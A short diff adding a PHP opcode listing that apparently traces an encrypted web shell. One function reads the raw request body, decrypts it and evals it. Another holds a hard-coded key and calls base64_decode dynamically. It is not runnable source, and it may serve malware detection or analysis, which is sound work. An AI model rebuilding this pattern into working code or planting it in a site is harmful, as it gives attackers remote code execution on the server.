@@ -1,0 +1,21 @@
+FunctionStart 
+INIT_FCALL 'error_reporting'
+DO_ICALL 
+INIT_FCALL 'decrypt'
+INIT_FCALL 'file_get_contents'
+SEND_VAL 'php://input'
+DO_ICALL 
+DO_FCALL 
+INCLUDE_OR_EVAL 'EVAL'
+RETURN 1
+FunctionEnd 
+FunctionStart 
+ASSIGN 'e45e329feb5d925b'
+ASSIGN 'base64_decode'
+INIT_DYNAMIC_CALL 
+DO_FCALL 
+ADD 1
+BW_AND 15
+RETURN 
+RETURN 'null'
+FunctionEnd 
